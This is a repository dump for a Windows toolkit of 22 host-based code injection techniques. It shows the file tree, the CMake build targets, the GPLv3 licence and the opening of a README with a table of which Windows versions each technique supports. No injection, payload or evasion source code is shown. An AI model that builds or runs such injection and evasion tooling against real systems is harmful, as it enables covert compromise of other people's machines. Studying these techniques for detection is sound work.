Project Path: arc_gmh5225_code_injection_4j7v0tzz

Source Tree:

```txt
arc_gmh5225_code_injection_4j7v0tzz
├── CMakeLists.txt
├── CMakeSettings.json
├── LICENSE
├── README.md
├── common
│   └── ntddk.h
├── mitigation
│   └── evasion
│       └── copysyscallstub.cpp
├── payload
│   ├── dll_payload.cpp
│   ├── executable_payload.cpp
│   └── shellcode.hpp
├── pe_injection
│   ├── dll_injection
│   │   ├── appcertdlls_injection.cpp
│   │   ├── appinitdlls_injection.cpp
│   │   ├── classic_dll_injection.cpp
│   │   ├── knowndllscache_injection.cpp
│   │   ├── setwindowshook_injection.cpp
│   │   └── shim_injection.cpp
│   ├── pe_inject.cpp
│   ├── process_doppelganging.cpp
│   ├── process_ghosting.cpp
│   ├── process_hollowing.cpp
│   └── transacted_hollowing.cpp
└── shellcode_injection
    ├── atombombing_injection.cpp
    ├── classic_shellcode_injection.cpp
    ├── entrypoint_injection.cpp
    ├── ewmi_injection.cpp
    ├── ghostwriting_injection.cpp
    ├── kernelcallbacktable_injection.cpp
    ├── propagate_injection.cpp
    ├── queueapc_injection.cpp
    ├── section_injection.cpp
    ├── threadcontext_injection.cpp
    └── tlscallback_injection.cpp

```

`CMakeLists.txt`:

```txt
cmake_minimum_required (VERSION 3.4)
project (code_injection)

include_directories(common)

# Mitigation
file(GLOB_RECURSE COPYSYSCALLSTUB_MITIGATION LIST_DIRECTORIES true mitigation/evasion/copysyscallstub.cpp)
add_executable(copysyscallstub_mitigation ${COPYSYSCALLSTUB_MITIGATION})
target_link_libraries(copysyscallstub_mitigation ntdll)

# Payload
file(GLOB_RECURSE DLL_PAYLOAD LIST_DIRECTORIES true payload/dll_payload.cpp)
add_library(dll_payload SHARED ${DLL_PAYLOAD})

file(GLOB_RECURSE EXECUTABLE_PAYLOAD LIST_DIRECTORIES true payload/executable_payload.cpp)
add_executable(executable_payload ${EXECUTABLE_PAYLOAD})

# PE Injection
file(GLOB_RECURSE PE_INJECTION LIST_DIRECTORIES true pe_injection/pe_inject.cpp)
add_executable(pe_injection ${PE_INJECTION})

file(GLOB_RECURSE PROCESS_HOLLOWING LIST_DIRECTORIES true pe_injection/process_hollowing.cpp)
add_executable(process_hollowing ${PROCESS_HOLLOWING})

file(GLOB_RECURSE PROCESS_DOPPELGANGING LIST_DIRECTORIES true pe_injection/process_doppelganging.cpp)
add_executable(process_doppelganging ${PROCESS_DOPPELGANGING} common/ntddk.h)
target_link_libraries(process_doppelganging ntdll Userenv KtmW32)

file(GLOB_RECURSE PROCESS_GHOSTING LIST_DIRECTORIES true pe_injection/process_ghosting.cpp)
add_executable(process_ghosting ${PROCESS_GHOSTING} common/ntddk.h)
target_link_libraries(process_ghosting ntdll Userenv KtmW32)

file(GLOB_RECURSE TRANSACTED_HOLLOWING LIST_DIRECTORIES true pe_injection/transacted_hollowing.cpp)
add_executable(transacted_hollowing ${TRANSACTED_HOLLOWING} common/ntddk.h)
target_link_libraries(transacted_hollowing ntdll KtmW32)

	#DLL Injection
	file(GLOB_RECURSE CLASSIC_DLL_INJECTION LIST_DIRECTORIES true pe_injection/dll_injection/classic_dll_injection.cpp)
	add_executable(classic_dll_injection ${CLASSIC_DLL_INJECTION})

	file(GLOB_RECURSE SETWINDOWHOOK_INJECTION LIST_DIRECTORIES true pe_injection/dll_injection/setwindowshook_injection.cpp)
	add_executable(setwindowhook_dll_injection ${SETWINDOWHOOK_INJECTION})

	file(GLOB_RECURSE APPINITDLLS_INJECTION LIST_DIRECTORIES true pe_injection/dll_injection/appinitdlls_injection.cpp)
	add_executable(appinitdlls_dll_injection ${APPINITDLLS_INJECTION})

	file(GLOB_RECURSE APPCERTDLLS_INJECTION LIST_DIRECTORIES true pe_injection/dll_injection/appcertdlls_injection.cpp)
	add_executable(appcertdlls_dll_injection ${APPCERTDLLS_INJECTION})

	file(GLOB_RECURSE SHIM_INJECTION LIST_DIRECTORIES true pe_injection/dll_injection/shim_injection.cpp)
	add_executable(shim_dll_injection ${SHIM_INJECTION})

	file(GLOB_RECURSE KNOWNDLLSCACHE_INJECTION LIST_DIRECTORIES true pe_injection/dll_injection/knowndllscache_injection.cpp)
	add_executable(knowndllscache_dll_injection ${KNOWNDLLSCACHE_INJECTION})
	target_link_libraries(knowndllscache_dll_injection ntdll)

# Shellcode Injection
file(GLOB_RECURSE CLASSIC_SHELLCODE_INJECTION LIST_DIRECTORIES true shellcode_injection/shellcode.hpp shellcode_injection/classic_shellcode_injection.cpp)
add_executable(classic_shellcode_injection ${CLASSIC_SHELLCODE_INJECTION})

file(GLOB_RECURSE ENTRYPOINT_INJECTION LIST_DIRECTORIES true shellcode_injection/shellcode.hpp shellcode_injection/entrypoint_injection.cpp)
add_executable(entrypoint_injection ${ENTRYPOINT_INJECTION})
target_link_libraries(entrypoint_injection ntdll)

file(GLOB_RECURSE QUEUEAPC_INJECTION LIST_DIRECTORIES true shellcode_injection/queueapc_injection.cpp)
add_executable(queueapc_injection ${QUEUEAPC_INJECTION})

file(GLOB_RECURSE ATOMBOMBING_INJECTION LIST_DIRECTORIES true shellcode_injection/atombombing_injection.cpp)
add_executable(atombombing_injection ${ATOMBOMBING_INJECTION})

file(GLOB_RECURSE THREADCONTEXT_INJECTION LIST_DIRECTORIES true shellcode_injection/threadcontext_injection.cpp)
add_executable(threadcontext_injection ${THREADCONTEXT_INJECTION})

file(GLOB_RECURSE PROPAGATE_INJECTION LIST_DIRECTORIES true shellcode_injection/propagate_injection.cpp)
add_executable(propagate_injection ${PROPAGATE_INJECTION})

file(GLOB_RECURSE EWMI_INJECTION LIST_DIRECTORIES true shellcode_injection/ewmi_injection.cpp)
add_executable(ewmi_injection ${EWMI_INJECTION})

file(GLOB_RECURSE GHOSTWRITING_INJECTION LIST_DIRECTORIES true shellcode_injection/ghostwriting_injection.cpp)
add_executable(ghostwriting_injection ${GHOSTWRITING_INJECTION})

file(GLOB_RECURSE KERNELCALLBACKTABLE_INJECTION LIST_DIRECTORIES true shellcode_injection/kernelcallbacktable_injection.cpp)
add_executable(kernelcallbacktable_injection ${KERNELCALLBACKTABLE_INJECTION})
target_link_libraries(kernelcallbacktable_injection ntdll)

file(GLOB_RECURSE TLSCALLBACK_INJECTION LIST_DIRECTORIES true shellcode_injection/tlscallback_injection.cpp)
add_executable(tlscallback_injection ${TLSCALLBACK_INJECTION})
target_link_libraries(tlscallback_injection ntdll)

file(GLOB_RECURSE SECTION_INJECTION LIST_DIRECTORIES true shellcode_injection/section_injection.cpp)
add_executable(section_injection ${SECTION_INJECTION})
target_link_libraries(section_injection ntdll)
```

`CMakeSettings.json`:

```json
{
  "configurations": [
    {
      "name": "x64-Debug",
      "generator": "Ninja",
      "configurationType": "Debug",
      "inheritEnvironments": [ "msvc_x64_x64" ],
      "buildRoot": "${projectDir}\\out\\build\\${name}",
      "installRoot": "${projectDir}\\out\\install\\${name}",
      "cmakeCommandArgs": "",
      "buildCommandArgs": "",
      "ctestCommandArgs": ""
    },
    {
      "name": "x86-Debug",
      "generator": "Ninja",
      "configurationType": "Debug",
      "buildRoot": "${projectDir}\\out\\build\\${name}",
      "installRoot": "${projectDir}\\out\\install\\${name}",
      "cmakeCommandArgs": "",
      "buildCommandArgs": "",
      "ctestCommandArgs": "",
      "inheritEnvironments": [ "msvc_x86" ],
      "variables": []
    }
  ]
}
```

`LICENSE`:

```
                    GNU GENERAL PUBLIC LICENSE
                       Version 3, 29 June 2007

 Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
 Everyone is permitted to copy and distribute verbatim copies
 of this license document, but changing it is not allowed.

                            Preamble

  The GNU General Public License is a free, copyleft license for
software and other kinds of works.

  The licenses for most software and other practical works are designed
to take away your freedom to share and change the works.  By contrast,
the GNU General Public License is intended to guarantee your freedom to
share and change all versions of a program--to make sure it remains free
software for all its users.  We, the Free Software Foundation, use the
GNU General Public License for most of our software; it applies also to
any other work released this way by its authors.  You can apply it to
your programs, too.

  When we speak of free software, we are referring to freedom, not
price.  Our General Public Licenses are designed to make sure that you
have the freedom to distribute copies of free software (and charge for
them if you wish), that you receive source code or can get it if you
want it, that you can change the software or use pieces of it in new
free programs, and that you know you can do these things.

  To protect your rights, we need to prevent others from denying you
these rights or asking you to surrender the rights.  Therefore, you have
certain responsibilities if you distribute copies of the software, or if
you modify it: responsibilities to respect the freedom of others.

  For example, if you distribute copies of such a program, whether
gratis or for a fee, you must pass on to the recipients the same
freedoms that you received.  You must make sure that they, too, receive
or can get the source code.  And you must show them these terms so they
know their rights.

  Developers that use the GNU GPL protect your rights with two steps:
(1) assert copyright on the software, and (2) offer you this License
giving you legal permission to copy, distribute and/or modify it.

  For the developers' and authors' protection, the GPL clearly explains
that there is no warranty for this free software.  For both users' and
authors' sake, the GPL requires that modified versions be marked as
changed, so that their problems will not be attributed erroneously to
authors of previous versions.

  Some devices are designed to deny users access to install or run
modified versions of the software inside them, although the manufacturer
can do so.  This is fundamentally incompatible with the aim of
protecting users' freedom to change the software.  The systematic
pattern of such abuse occurs in the area of products for individuals to
use, which is precisely where it is most unacceptable.  Therefore, we
have designed this version of the GPL to prohibit the practice for those
products.  If such problems arise substantially in other domains, we
stand ready to extend this provision to those domains in future versions
of the GPL, as needed to protect the freedom of users.

  Finally, every program is threatened constantly by software patents.
States should not allow patents to restrict development and use of
software on general-purpose computers, but in those that do, we wish to
avoid the special danger that patents applied to a free program could
make it effectively proprietary.  To prevent this, the GPL assures that
patents cannot be used to render the program non-free.

  The precise terms and conditions for copying, distribution and
modification follow.

                       TERMS AND CONDITIONS

  0. Definitions.

  "This License" refers to version 3 of the GNU General Public License.

  "Copyright" also means copyright-like laws that apply to other kinds of
works, such as semiconductor masks.

  "The Program" refers to any copyrightable work licensed under this
License.  Each licensee is addressed as "you".  "Licensees" and
"recipients" may be individuals or organizations.

  To "modify" a work means to copy from or adapt all or part of the work
in a fashion requiring copyright permission, other than the making of an
exact copy.  The resulting work is called a "modified version" of the
earlier work or a work "based on" the earlier work.

  A "covered work" means either the unmodified Program or a work based
on the Program.

  To "propagate" a work means to do anything with it that, without
permission, would make you directly or secondarily liable for
infringement under applicable copyright law, except executing it on a
computer or modifying a private copy.  Propagation includes copying,
distribution (with or without modification), making available to the
public, and in some countries other activities as well.

  To "convey" a work means any kind of propagation that enables other
parties to make or receive copies.  Mere interaction with a user through
a computer network, with no transfer of a copy, is not conveying.

  An interactive user interface displays "Appropriate Legal Notices"
to the extent that it includes a convenient and prominently visible
feature that (1) displays an appropriate copyright notice, and (2)
tells the user that there is no warranty for the work (except to the
extent that warranties are provided), that licensees may convey the
work under this License, and how to view a copy of this License.  If
the interface presents a list of user commands or options, such as a
menu, a prominent item in the list meets this criterion.

  1. Source Code.

  The "source code" for a work means the preferred form of the work
for making modifications to it.  "Object code" means any non-source
form of a work.

  A "Standard Interface" means an interface that either is an official
standard defined by a recognized standards body, or, in the case of
interfaces specified for a particular programming language, one that
is widely used among developers working in that language.

  The "System Libraries" of an executable work include anything, other
than the work as a whole, that (a) is included in the normal form of
packaging a Major Component, but which is not part of that Major
Component, and (b) serves only to enable use of the work with that
Major Component, or to implement a Standard Interface for which an
implementation is available to the public in source code form.  A
"Major Component", in this context, means a major essential component
(kernel, window system, and so on) of the specific operating system
(if any) on which the executable work runs, or a compiler used to
produce the work, or an object code interpreter used to run it.

  The "Corresponding Source" for a work in object code form means all
the source code needed to generate, install, and (for an executable
work) run the object code and to modify the work, including scripts to
control those activities.  However, it does not include the work's
System Libraries, or general-purpose tools or generally available free
programs which are used unmodified in performing those activities but
which are not part of the work.  For example, Corresponding Source
includes interface definition files associated with source files for
the work, and the source code for shared libraries and dynamically
linked subprograms that the work is specifically designed to require,
such as by intimate data communication or control flow between those
subprograms and other parts of the work.

  The Corresponding Source need not include anything that users
can regenerate automatically from other parts of the Corresponding
Source.

  The Corresponding Source for a work in source code form is that
same work.

  2. Basic Permissions.

  All rights granted under this License are granted for the term of
copyright on the Program, and are irrevocable provided the stated
conditions are met.  This License explicitly affirms your unlimited
permission to run the unmodified Program.  The output from running a
covered work is covered by this License only if the output, given its
content, constitutes a covered work.  This License acknowledges your
rights of fair use or other equivalent, as provided by copyright law.

  You may make, run and propagate covered works that you do not
convey, without conditions so long as your license otherwise remains
in force.  You may convey covered works to others for the sole purpose
of having them make modifications exclusively for you, or provide you
with facilities for running those works, provided that you comply with
the terms of this License in conveying all material for which you do
not control copyright.  Those thus making or running the covered works
for you must do so exclusively on your behalf, under your direction
and control, on terms that prohibit them from making any copies of
your copyrighted material outside their relationship with you.

  Conveying under any other circumstances is permitted solely under
the conditions stated below.  Sublicensing is not allowed; section 10
makes it unnecessary.

  3. Protecting Users' Legal Rights From Anti-Circumvention Law.

  No covered work shall be deemed part of an effective technological
measure under any applicable law fulfilling obligations under article
11 of the WIPO copyright treaty adopted on 20 December 1996, or
similar laws prohibiting or restricting circumvention of such
measures.

  When you convey a covered work, you waive any legal power to forbid
circumvention of technological measures to the extent such circumvention
is effected by exercising rights under this License with respect to
the covered work, and you disclaim any intention to limit operation or
modification of the work as a means of enforcing, against the work's
users, your or third parties' legal rights to forbid circumvention of
technological measures.

  4. Conveying Verbatim Copies.

  You may convey verbatim copies of the Program's source code as you
receive it, in any medium, provided that you conspicuously and
appropriately publish on each copy an appropriate copyright notice;
keep intact all notices stating that this License and any
non-permissive terms added in accord with section 7 apply to the code;
keep intact all notices of the absence of any warranty; and give all
recipients a copy of this License along with the Program.

  You may charge any price or no price for each copy that you convey,
and you may offer support or warranty protection for a fee.

  5. Conveying Modified Source Versions.

  You may convey a work based on the Program, or the modifications to
produce it from the Program, in the form of source code under the
terms of section 4, provided that you also meet all of these conditions:

    a) The work must carry prominent notices stating that you modified
    it, and giving a relevant date.

    b) The work must carry prominent notices stating that it is
    released under this License and any conditions added under section
    7.  This requirement modifies the requirement in section 4 to
    "keep intact all notices".

    c) You must license the entire work, as a whole, under this
    License to anyone who comes into possession of a copy.  This
    License will therefore apply, along with any applicable section 7
    additional terms, to the whole of the work, and all its parts,
    regardless of how they are packaged.  This License gives no
    permission to license the work in any other way, but it does not
    invalidate such permission if you have separately received it.

    d) If the work has interactive user interfaces, each must display
    Appropriate Legal Notices; however, if the Program has interactive
    interfaces that do not display Appropriate Legal Notices, your
    work need not make them do so.

  A compilation of a covered work with other separate and independent
works, which are not by their nature extensions of the covered work,
and which are not combined with it such as to form a larger program,
in or on a volume of a storage or distribution medium, is called an
"aggregate" if the compilation and its resulting copyright are not
used to limit the access or legal rights of the compilation's users
beyond what the individual works permit.  Inclusion of a covered work
in an aggregate does not cause this License to apply to the other
parts of the aggregate.

  6. Conveying Non-Source Forms.

  You may convey a covered work in object code form under the terms
of sections 4 and 5, provided that you also convey the
machine-readable Corresponding Source under the terms of this License,
in one of these ways:

    a) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by the
    Corresponding Source fixed on a durable physical medium
    customarily used for software interchange.

    b) Convey the object code in, or embodied in, a physical product
    (including a physical distribution medium), accompanied by a
    written offer, valid for at least three years and valid for as
    long as you offer spare parts or customer support for that product
    model, to give anyone who possesses the object code either (1) a
    copy of the Corresponding Source for all the software in the
    product that is covered by this License, on a durable physical
    medium customarily used for software interchange, for a price no
    more than your reasonable cost of physically performing this
    conveying of source, or (2) access to copy the
    Corresponding Source from a network server at no charge.

    c) Convey individual copies of the object code with a copy of the
    written offer to provide the Corresponding Source.  This
    alternative is allowed only occasionally and noncommercially, and
    only if you received the object code with such an offer, in accord
    with subsection 6b.

    d) Convey the object code by offering access from a designated
    place (gratis or for a charge), and offer equivalent access to the
    Corresponding Source in the same way through the same place at no
    further charge.  You need not require recipients to copy the
    Corresponding Source along with the object code.  If the place to
    copy the object code is a network server, the Corresponding Source
    may be on a different server (operated by you or a third party)
    that supports equivalent copying facilities, provided you maintain
    clear directions next to the object code saying where to find the
    Corresponding Source.  Regardless of what server hosts the
    Corresponding Source, you remain obligated to ensure that it is
    available for as long as needed to satisfy these requirements.

    e) Convey the object code using peer-to-peer transmission, provided
    you inform other peers where the object code and Corresponding
    Source of the work are being offered to the general public at no
    charge under subsection 6d.

  A separable portion of the object code, whose source code is excluded
from the Corresponding Source as a System Library, need not be
included in conveying the object code work.

  A "User Product" is either (1) a "consumer product", which means any
tangible personal property which is normally used for personal, family,
or household purposes, or (2) anything designed or sold for incorporation
into a dwelling.  In determining whether a product is a consumer product,
doubtful cases shall be resolved in favor of coverage.  For a particular
product received by a particular user, "normally used" refers to a
typical or common use of that class of product, regardless of the status
of the particular user or of the way in which the particular user
actually uses, or expects or is expected to use, the product.  A product
is a consumer product regardless of whether the product has substantial
commercial, industrial or non-consumer uses, unless such uses represent
the only significant mode of use of the product.

  "Installation Information" for a User Product means any methods,
procedures, authorization keys, or other information required to install
and execute modified versions of a covered work in that User Product from
a modified version of its Corresponding Source.  The information must
suffice to ensure that the continued functioning of the modified object
code is in no case prevented or interfered with solely because
modification has been made.

  If you convey an object code work under this section in, or with, or
specifically for use in, a User Product, and the conveying occurs as
part of a transaction in which the right of possession and use of the
User Product is transferred to the recipient in perpetuity or for a
fixed term (regardless of how the transaction is characterized), the
Corresponding Source conveyed under this section must be accompanied
by the Installation Information.  But this requirement does not apply
if neither you nor any third party retains the ability to install
modified object code on the User Product (for example, the work has
been installed in ROM).

  The requirement to provide Installation Information does not include a
requirement to continue to provide support service, warranty, or updates
for a work that has been modified or installed by the recipient, or for
the User Product in which it has been modified or installed.  Access to a
network may be denied when the modification itself materially and
adversely affects the operation of the network or violates the rules and
protocols for communication across the network.

  Corresponding Source conveyed, and Installation Information provided,
in accord with this section must be in a format that is publicly
documented (and with an implementation available to the public in
source code form), and must require no special password or key for
unpacking, reading or copying.

  7. Additional Terms.

  "Additional permissions" are terms that supplement the terms of this
License by making exceptions from one or more of its conditions.
Additional permissions that are applicable to the entire Program shall
be treated as though they were included in this License, to the extent
that they are valid under applicable law.  If additional permissions
apply only to part of the Program, that part may be used separately
under those permissions, but the entire Program remains governed by
this License without regard to the additional permissions.

  When you convey a copy of a covered work, you may at your option
remove any additional permissions from that copy, or from any part of
it.  (Additional permissions may be written to require their own
removal in certain cases when you modify the work.)  You may place
additional permissions on material, added by you to a covered work,
for which you have or can give appropriate copyright permission.

  Notwithstanding any other provision of this License, for material you
add to a covered work, you may (if authorized by the copyright holders of
that material) supplement the terms of this License with terms:

    a) Disclaiming warranty or limiting liability differently from the
    terms of sections 15 and 16 of this License; or

    b) Requiring preservation of specified reasonable legal notices or
    author attributions in that material or in the Appropriate Legal
    Notices displayed by works containing it; or

    c) Prohibiting misrepresentation of the origin of that material, or
    requiring that modified versions of such material be marked in
    reasonable ways as different from the original version; or

    d) Limiting the use for publicity purposes of names of licensors or
    authors of the material; or

    e) Declining to grant rights under trademark law for use of some
    trade names, trademarks, or service marks; or

    f) Requiring indemnification of licensors and authors of that
    material by anyone who conveys the material (or modified versions of
    it) with contractual assumptions of liability to the recipient, for
    any liability that these contractual assumptions directly impose on
    those licensors and authors.

  All other non-permissive additional terms are considered "further
restrictions" within the meaning of section 10.  If the Program as you
received it, or any part of it, contains a notice stating that it is
governed by this License along with a term that is a further
restriction, you may remove that term.  If a license document contains
a further restriction but permits relicensing or conveying under this
License, you may add to a covered work material governed by the terms
of that license document, provided that the further restriction does
not survive such relicensing or conveying.

  If you add terms to a covered work in accord with this section, you
must place, in the relevant source files, a statement of the
additional terms that apply to those files, or a notice indicating
where to find the applicable terms.

  Additional terms, permissive or non-permissive, may be stated in the
form of a separately written license, or stated as exceptions;
the above requirements apply either way.

  8. Termination.

  You may not propagate or modify a covered work except as expressly
provided under this License.  Any attempt otherwise to propagate or
modify it is void, and will automatically terminate your rights under
this License (including any patent licenses granted under the third
paragraph of section 11).

  However, if you cease all violation of this License, then your
license from a particular copyright holder is reinstated (a)
provisionally, unless and until the copyright holder explicitly and
finally terminates your license, and (b) permanently, if the copyright
holder fails to notify you of the violation by some reasonable means
prior to 60 days after the cessation.

  Moreover, your license from a particular copyright holder is
reinstated permanently if the copyright holder notifies you of the
violation by some reasonable means, this is the first time you have
received notice of violation of this License (for any work) from that
copyright holder, and you cure the violation prior to 30 days after
your receipt of the notice.

  Termination of your rights under this section does not terminate the
licenses of parties who have received copies or rights from you under
this License.  If your rights have been terminated and not permanently
reinstated, you do not qualify to receive new licenses for the same
material under section 10.

  9. Acceptance Not Required for Having Copies.

  You are not required to accept this License in order to receive or
run a copy of the Program.  Ancillary propagation of a covered work
occurring solely as a consequence of using peer-to-peer transmission
to receive a copy likewise does not require acceptance.  However,
nothing other than this License grants you permission to propagate or
modify any covered work.  These actions infringe copyright if you do
not accept this License.  Therefore, by modifying or propagating a
covered work, you indicate your acceptance of this License to do so.

  10. Automatic Licensing of Downstream Recipients.

  Each time you convey a covered work, the recipient automatically
receives a license from the original licensors, to run, modify and
propagate that work, subject to this License.  You are not responsible
for enforcing compliance by third parties with this License.

  An "entity transaction" is a transaction transferring control of an
organization, or substantially all assets of one, or subdividing an
organization, or merging organizations.  If propagation of a covered
work results from an entity transaction, each party to that
transaction who receives a copy of the work also receives whatever
licenses to the work the party's predecessor in interest had or could
give under the previous paragraph, plus a right to possession of the
Corresponding Source of the work from the predecessor in interest, if
the predecessor has it or can get it with reasonable efforts.

  You may not impose any further restrictions on the exercise of the
rights granted or affirmed under this License.  For example, you may
not impose a license fee, royalty, or other charge for exercise of
rights granted under this License, and you may not initiate litigation
(including a cross-claim or counterclaim in a lawsuit) alleging that
any patent claim is infringed by making, using, selling, offering for
sale, or importing the Program or any portion of it.

  11. Patents.

  A "contributor" is a copyright holder who authorizes use under this
License of the Program or a work on which the Program is based.  The
work thus licensed is called the contributor's "contributor version".

  A contributor's "essential patent claims" are all patent claims
owned or controlled by the contributor, whether already acquired or
hereafter acquired, that would be infringed by some manner, permitted
by this License, of making, using, or selling its contributor version,
but do not include claims that would be infringed only as a
consequence of further modification of the contributor version.  For
purposes of this definition, "control" includes the right to grant
patent sublicenses in a manner consistent with the requirements of
this License.

  Each contributor grants you a non-exclusive, worldwide, royalty-free
patent license under the contributor's essential patent claims, to
make, use, sell, offer for sale, import and otherwise run, modify and
propagate the contents of its contributor version.

  In the following three paragraphs, a "patent license" is any express
agreement or commitment, however denominated, not to enforce a patent
(such as an express permission to practice a patent or covenant not to
sue for patent infringement).  To "grant" such a patent license to a
party means to make such an agreement or commitment not to enforce a
patent against the party.

  If you convey a covered work, knowingly relying on a patent license,
and the Corresponding Source of the work is not available for anyone
to copy, free of charge and under the terms of this License, through a
publicly available network server or other readily accessible means,
then you must either (1) cause the Corresponding Source to be so
available, or (2) arrange to deprive yourself of the benefit of the
patent license for this particular work, or (3) arrange, in a manner
consistent with the requirements of this License, to extend the patent
license to downstream recipients.  "Knowingly relying" means you have
actual knowledge that, but for the patent license, your conveying the
covered work in a country, or your recipient's use of the covered work
in a country, would infringe one or more identifiable patents in that
country that you have reason to believe are valid.

  If, pursuant to or in connection with a single transaction or
arrangement, you convey, or propagate by procuring conveyance of, a
covered work, and grant a patent license to some of the parties
receiving the covered work authorizing them to use, propagate, modify
or convey a specific copy of the covered work, then the patent license
you grant is automatically extended to all recipients of the covered
work and works based on it.

  A patent license is "discriminatory" if it does not include within
the scope of its coverage, prohibits the exercise of, or is
conditioned on the non-exercise of one or more of the rights that are
specifically granted under this License.  You may not convey a covered
work if you are a party to an arrangement with a third party that is
in the business of distributing software, under which you make payment
to the third party based on the extent of your activity of conveying
the work, and under which the third party grants, to any of the
parties who would receive the covered work from you, a discriminatory
patent license (a) in connection with copies of the covered work
conveyed by you (or copies made from those copies), or (b) primarily
for and in connection with specific products or compilations that
contain the covered work, unless you entered into that arrangement,
or that patent license was granted, prior to 28 March 2007.

  Nothing in this License shall be construed as excluding or limiting
any implied license or other defenses to infringement that may
otherwise be available to you under applicable patent law.

  12. No Surrender of Others' Freedom.

  If conditions are imposed on you (whether by court order, agreement or
otherwise) that contradict the conditions of this License, they do not
excuse you from the conditions of this License.  If you cannot convey a
covered work so as to satisfy simultaneously your obligations under this
License and any other pertinent obligations, then as a consequence you may
not convey it at all.  For example, if you agree to terms that obligate you
to collect a royalty for further conveying from those to whom you convey
the Program, the only way you could satisfy both those terms and this
License would be to refrain entirely from conveying the Program.

  13. Use with the GNU Affero General Public License.

  Notwithstanding any other provision of this License, you have
permission to link or combine any covered work with a work licensed
under version 3 of the GNU Affero General Public License into a single
combined work, and to convey the resulting work.  The terms of this
License will continue to apply to the part which is the covered work,
but the special requirements of the GNU Affero General Public License,
section 13, concerning interaction through a network will apply to the
combination as such.

  14. Revised Versions of this License.

  The Free Software Foundation may publish revised and/or new versions of
the GNU General Public License from time to time.  Such new versions will
be similar in spirit to the present version, but may differ in detail to
address new problems or concerns.

  Each version is given a distinguishing version number.  If the
Program specifies that a certain numbered version of the GNU General
Public License "or any later version" applies to it, you have the
option of following the terms and conditions either of that numbered
version or of any later version published by the Free Software
Foundation.  If the Program does not specify a version number of the
GNU General Public License, you may choose any version ever published
by the Free Software Foundation.

  If the Program specifies that a proxy can decide which future
versions of the GNU General Public License can be used, that proxy's
public statement of acceptance of a version permanently authorizes you
to choose that version for the Program.

  Later license versions may give you additional or different
permissions.  However, no additional obligations are imposed on any
author or copyright holder as a result of your choosing to follow a
later version.

  15. Disclaimer of Warranty.

  THERE IS NO WARRANTY FOR THE PROGRAM, TO THE EXTENT PERMITTED BY
APPLICABLE LAW.  EXCEPT WHEN OTHERWISE STATED IN WRITING THE COPYRIGHT
HOLDERS AND/OR OTHER PARTIES PROVIDE THE PROGRAM "AS IS" WITHOUT WARRANTY
OF ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING, BUT NOT LIMITED TO,
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
PURPOSE.  THE ENTIRE RISK AS TO THE QUALITY AND PERFORMANCE OF THE PROGRAM
IS WITH YOU.  SHOULD THE PROGRAM PROVE DEFECTIVE, YOU ASSUME THE COST OF
ALL NECESSARY SERVICING, REPAIR OR CORRECTION.

  16. Limitation of Liability.

  IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING
WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS
THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY
GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD
PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS),
EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF
SUCH DAMAGES.

  17. Interpretation of Sections 15 and 16.

  If the disclaimer of warranty and limitation of liability provided
above cannot be given local legal effect according to their terms,
reviewing courts shall apply local law that most closely approximates
an absolute waiver of all civil liability in connection with the
Program, unless a warranty or assumption of liability accompanies a
copy of the Program in return for a fee.

                     END OF TERMS AND CONDITIONS

            How to Apply These Terms to Your New Programs

  If you develop a new program, and you want it to be of the greatest
possible use to the public, the best way to achieve this is to make it
free software which everyone can redistribute and change under these terms.

  To do so, attach the following notices to the program.  It is safest
to attach them to the start of each source file to most effectively
state the exclusion of warranty; and each file should have at least
the "copyright" line and a pointer to where the full notice is found.

    <one line to give the program's name and a brief idea of what it does.>
    Copyright (C) <year>  <name of author>

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <https://www.gnu.org/licenses/>.

Also add information on how to contact you by electronic and paper mail.

  If the program does terminal interaction, make it output a short
notice like this when it starts in an interactive mode:

    <program>  Copyright (C) <year>  <name of author>
    This program comes with ABSOLUTELY NO WARRANTY; for details type `show w'.
    This is free software, and you are welcome to redistribute it
    under certain conditions; type `show c' for details.

The hypothetical commands `show w' and `show c' should show the appropriate
parts of the General Public License.  Of course, your program's commands
might be different; for a GUI interface, you would use an "about box".

  You should also get your employer (if you work as a programmer) or school,
if any, to sign a "copyright disclaimer" for the program, if necessary.
For more information on this, and how to apply and follow the GNU GPL, see
<https://www.gnu.org/licenses/>.

  The GNU General Public License does not permit incorporating your program
into proprietary programs.  If your program is a subroutine library, you
may consider it more useful to permit linking proprietary applications with
the library.  If this is what you want to do, use the GNU Lesser General
Public License instead of this License.  But first, please read
<https://www.gnu.org/licenses/why-not-lgpl.html>.

```

`README.md`:

```md
# Code injections
This repository contains 22 implementations of Host-Based Code Injection Attacks (HBCIAs).


## PE injections
Feature | 		Classic		|	 Process Doppelgänging 	| Process Hollowing 	| Transacted Hollowing  | Process Ghosting
--------| 		:-: 		|    :-: 					| :-: 			        | :-:               	| :-: 
32 Bit			| 	   ✔	|		✔					|       ✔		 		|   	✔				|	✔
64 Bit			| 	 ✔		|		✔		            |		✔	 			|		✔				|	✔
WoW64			| 	 ✔		|		➖					|		✔		 		|		✔				|	➖
Windows 7		| 	 ✔     |		✔					|		✔		 		|		✔				|	✔
Windows 10		| 	 ✔     |		❌					|		✔		 		|		✔		 		|	✔


## DLL injections
Feature | 		Classic		|	 AppCertDLLs 	| AppInitDLLs 	| KnownDLLs Cache  	| SetWindowsHookEx	| Shim
